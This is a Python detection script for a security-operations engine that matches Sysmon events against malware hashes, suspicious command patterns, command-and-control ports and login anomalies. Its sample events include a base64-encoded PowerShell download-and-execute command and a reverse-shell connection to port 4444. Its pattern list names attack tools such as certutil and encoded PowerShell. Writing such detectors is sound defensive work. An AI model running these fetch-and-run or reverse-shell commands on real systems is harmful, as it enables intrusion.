import os
import json
from datetime import datetime, timezone

BASE_DIR = os.path.expanduser("~/internee-soc-edr")
IOC_FILE = os.path.join(BASE_DIR, "data/malwarebazaar_iocs.json")
ALERT_LOG = os.path.join(BASE_DIR, "logs/alerts.jsonl")

SUSPICIOUS_PROC_PATTERNS = [
    "powershell.exe -enc",
    "powershell -nop -w hidden",
    "cmd.exe /c whoami",
    "certutil -urlcache",
    "mshta.exe",
    "curl http",
    "wget http"
]

def emit_alert(severity, category, message, details):
    alert = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "source": "Internee.pk-SOC-Engine",
        "severity": severity,
        "category": category,
        "message": message,
        "details": details
    }
    with open(ALERT_LOG, "a") as f:
        f.write(json.dumps(alert) + "\n")
    print(f"[ALERT | {severity}] {category}: {message} -> {details}")

def load_iocs():
    with open(IOC_FILE) as f:
        return json.load(f)

def analyze_sysmon_event(event, iocs):
    eid = event.get("event_id")
    user = event.get("user", "unknown")
    host = event.get("host", "unknown")
    proc = event.get("process", "")
    parent = event.get("parent_process", "")
    sha256 = event.get("sha256", "").lower()
    dest_ip = event.get("dest_ip", "")
    dest_port = event.get("dest_port", 0)

    # 1. MalwareBazaar Hash Correlation
    if sha256 in iocs:
        ioc = iocs[sha256]
        emit_alert("CRITICAL", "MALWAREBAZAAR_IOC_MATCH", "Known malicious hash detected", {
            "host": host, "user": user, "process": proc, "sha256": sha256, "intel": ioc
        })

    # 2. Sysmon Event ID 1: Suspicious Process / Living-off-the-Land
    if eid == 1:
        lower_proc = proc.lower()
        if any(pat in lower_proc for pat in SUSPICIOUS_PROC_PATTERNS) or (
            parent.lower().endswith(("winword.exe", "excel.exe")) and "powershell" in lower_proc
        ):
            emit_alert("HIGH", "SYSMON_SUSPICIOUS_PROCESS", "Suspicious command or parent-child execution", {
                "host": host, "user": user, "parent": parent, "command": proc
            })

    # 3. Sysmon Event ID 3: Suspicious Outbound Network Connection
    if eid == 3 and dest_port in [4444, 1337, 8443, 9001]:
        emit_alert("HIGH", "SYSMON_C2_NETWORK", "Outbound connection to common C2/unusual port", {
            "host": host, "user": user, "process": proc, "dest_ip": dest_ip, "dest_port": dest_port
        })

def analyze_user_activity(activity):
    user = activity.get("user")
    host = activity.get("host")
    hour = activity.get("hour", 12)
    failed_logins = activity.get("failed_logins", 0)
    sudo_used = activity.get("sudo_escalation", False)

    if failed_logins >= 5:
        emit_alert("HIGH", "USER_BRUTEFORCE_ANOMALY", "Excessive failed authentication attempts", {
            "host": host, "user": user, "failed_logins": failed_logins
        })

    if sudo_used and (hour < 6 or hour > 22):
        emit_alert("MEDIUM", "USER_OFFHOURS_PRIV_ESC", "Privileged action outside working hours", {
            "host": host, "user": user, "hour": hour
        })

def main():
    iocs = load_iocs()

    sample_sysmon_events = [
        {
            "event_id": 1,
            "host": "WKSTN-FIN-01",
            "user": "CORP\\ali.zain",
            "parent_process": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
            "process": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA1ADAALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
            "sha256": "2e315b3f49d6675c54d2ec897e5971361ce82cf28cb3debca3a88d848aaa9d08"
        },
        {
            "event_id": 3,
            "host": "SRV-APP-02",
            "user": "CORP\\svc_web",
            "process": "python3 reverse_shell.py",
            "dest_ip": "185.220.101.45",
            "dest_port": 4444
        }
    ]

    sample_user_activities = [
        {"host": "SRV-APP-02", "user": "admin_ops", "hour": 2, "failed_logins": 7, "sudo_escalation": True}
    ]

    for ev in sample_sysmon_events:
        analyze_sysmon_event(ev, iocs)

    for act in sample_user_activities:
        analyze_user_activity(act)

if __name__ == "__main__":
    main()
